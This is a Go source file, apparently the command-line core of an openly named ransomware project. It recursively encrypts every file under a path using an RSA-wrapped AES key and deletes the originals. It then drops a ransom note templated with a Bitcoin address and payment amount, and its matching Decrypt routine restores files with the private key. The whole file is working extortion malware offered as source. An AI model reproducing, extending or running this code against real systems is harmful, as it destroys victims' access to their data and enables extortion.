package cli

import (
	"bufio"
	"bytes"
	"crypto/rsa"
	"encoding/base64"
	"errors"
	"fmt"
	iofs "io/fs"
	"log"
	"os"
	"path/filepath"
	"strings"
	"text/template"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/fs"
	urfavecli "github.com/urfave/cli/v2"
)

type Ransom struct {
	BitcoinAddress string
	BitcoinCount   float32
	PublicKey      string
}

func LoadPublicKey(path string) (*rsa.PublicKey, error) {
	rsaPublicString, err := fs.ReadStringFileContent(path)

	if err != nil {
		return nil, err
	}

	rsaPublic, err := crypto.ParseRsaPublicKeyFromPemStr(rsaPublicString)

	if err != nil {
		return nil, err
	}

	return rsaPublic, nil
}

func LoadPrivateKey(path string) (*rsa.PrivateKey, error) {
	rsaPrivateString, err := fs.ReadStringFileContent(path)

	if err != nil {
		return nil, err
	}

	rsaPrivate, err := crypto.ParseRsaPrivateKeyFromPemStr(rsaPrivateString)

	if err != nil {
		return nil, err
	}

	return rsaPrivate, nil
}

func Encrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")

	if path == "" {
		return errors.New("path argument is required")
	}

	publicKeyPath := ctx.String("publicKey")

	if publicKeyPath == "" {
		return errors.New("publicKey argument is required")
	}

	publicKey, err := LoadPublicKey(publicKeyPath)

	if err != nil {
		return err
	}

	log.Println("RSA public key loaded")

	log.Println("Generating new AES key for current session")
	plainAesKey, err := crypto.NewRandomAesKey(crypto.AES_KEY_SIZE)

	if err != nil {
		return err
	}

	encryptedAesKey, err := crypto.RsaEncrypt(plainAesKey, publicKey)

	if err != nil {
		return err
	}

	addRansom := ctx.Bool("addRansom")
	ransomTemplatePath := ctx.String("ransomTemplatePath")
	ransomFileName := ctx.String("ransomFileName")
	bitcoinCount := ctx.Float64("bitcoinCount")
	bitcoinAddress := ctx.String("bitcoinAddress")

	skipHidden := ctx.Bool("skipHidden")
	dryRun := ctx.Bool("dryRun")
	extBlacklist := strings.Split(ctx.String("extBlacklist"), ",")
	extWhitelist := strings.Split(ctx.String("extWhitelist"), ",")
	encSuffix := ctx.String("encSuffix")

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)
	log.Printf("Blacklisted extensions = %v", extBlacklist)
	log.Printf("Whitelisted extensions = %v", extWhitelist)
	log.Printf("Skipping hidden files/folders = %t", skipHidden)
	log.Printf("DryRun enabled = %t", dryRun)
	log.Printf("EncSuffix = %s", encSuffix)
	log.Printf("Encrypted key size = %d", len(encryptedAesKey))
	log.Printf("Encrypted key = %s", base64.StdEncoding.EncodeToString(encryptedAesKey))
	log.Printf("BitcoinAddress = %s", bitcoinAddress)
	log.Printf("BitcoinCount = %f", bitcoinCount)
	log.Printf("Ransom file template = %s", ransomTemplatePath)
	log.Printf("Ransom file name = %s", ransomFileName)

	err = fs.WalkFilesWithExtFilter(absolutePath, extBlacklist, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
		err := encryptFile(path, plainAesKey, encryptedAesKey, encSuffix)

		if err != nil {
			return err
		}

		if !dryRun {
			err := fs.DeleteFileIfExists(path)

			if err != nil {
				return err
			}
		}

		return nil
	})

	if addRansom {
		ransomPath := filepath.Join(absolutePath, ransomFileName)

		log.Printf("Adding ransom file at %s", ransomPath)

		if _, err := os.Stat(ransomPath); errors.Is(err, os.ErrNotExist) {
			// Ransom file does not exist

			if ransomTemplatePath == "" {
				return errors.New("if you want to add a ransom you must provide a templatePath")
			}

			templateAbsPath, err := filepath.Abs(ransomTemplatePath)

			if err != nil {
				return err
			}

			template, err := template.ParseFiles(templateAbsPath)

			if err != nil {
				return err
			}

			textPublicKey, err := crypto.ExportRsaPublicKeyAsPemStr(publicKey)

			if err != nil {
				return err
			}

			file, err := os.Create(ransomPath)

			if err != nil {
				return err
			}

			defer file.Close()

			writer := bufio.NewWriter(file)

			err = template.Execute(writer, &Ransom{
				BitcoinCount:   float32(bitcoinCount),
				BitcoinAddress: bitcoinAddress,
				PublicKey:      textPublicKey,
			})

			if err != nil {
				return err
			}

			writer.Flush()
		} else {
			log.Printf("Ransom file already exists at %s. Skipping generation", ransomPath)
		}
	}

	return err
}

func Decrypt(ctx *urfavecli.Context) error {
	path := ctx.String("path")

	if path == "" {
		return errors.New("path argument is required")
	}

	privateKeyPath := ctx.String("privateKey")

	if privateKeyPath == "" {
		return errors.New("publicKey argument is required")
	}

	rsaPrivateKey, err := LoadPrivateKey(privateKeyPath)

	if err != nil {
		return err
	}

	log.Println("RSA private key loaded")

	dryRun := ctx.Bool("dryRun")
	skipHidden := ctx.Bool("skipHidden")
	encSuffix := ctx.String("encSuffix")
	ransomFileName := ctx.String("ransomFileName")
	extWhitelist := []string{encSuffix}

	log.Printf("EncSuffix = %s", encSuffix)
	log.Printf("DryRun enabled = %t", dryRun)
	log.Printf("Whitelisted extensions = %v", extWhitelist)
	log.Printf("Ransom file name = %s", ransomFileName)
	log.Printf("Skip Hidden = %t", skipHidden)

	absolutePath, err := filepath.Abs(path)

	if err != nil {
		return err
	}

	log.Printf("Running ransomware tool on %s", absolutePath)

	err = fs.WalkFilesWithExtFilter(absolutePath, nil, extWhitelist, skipHidden, func(path string, info iofs.FileInfo) error {
		err := decryptFile(path, rsaPrivateKey, encSuffix)

		if err != nil {
			return err
		}

		if !dryRun {
			err := fs.DeleteFileIfExists(path)

			if err != nil {
				return err
			}
		}

		return nil
	})

	// Delete root ransom file (if any)
	fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))

	return err
}

func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
	log.Printf("Encrypting %s", path)

	newFilePath := fmt.Sprintf("%s%s", path, encSuffix)

	plainText, err := os.ReadFile(path)

	if err != nil {
		return err
	}

	cipherText, err := crypto.AesEncrypt(plainText, aesKey)

	if err != nil {
		return err
	}

	fileContent := append(encryptedAesKey, cipherText...)

	return fs.WriteStringToFile(newFilePath, string(fileContent))
}

func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
	log.Printf("Decrypting %s", path)

	cipherText, err := os.ReadFile(path)

	newFilePath := strings.Replace(path, encSuffix, "", 1)

	if err != nil {
		return err
	}

	byteReader := bytes.NewReader(cipherText)
	encryptedAesKey := make([]byte, 256)

	_, err = byteReader.ReadAt(encryptedAesKey, 0)

	if err != nil {
		return err
	}

	aesKey, err := crypto.RsaDecrypt(encryptedAesKey, rsaPrivateKey)

	if err != nil {
		return err
	}

	plaintext, err := crypto.AesDecrypt(cipherText[len(encryptedAesKey):], aesKey)

	if err != nil {
		return err
	}

	return fs.WriteToFile(newFilePath, plaintext)
}
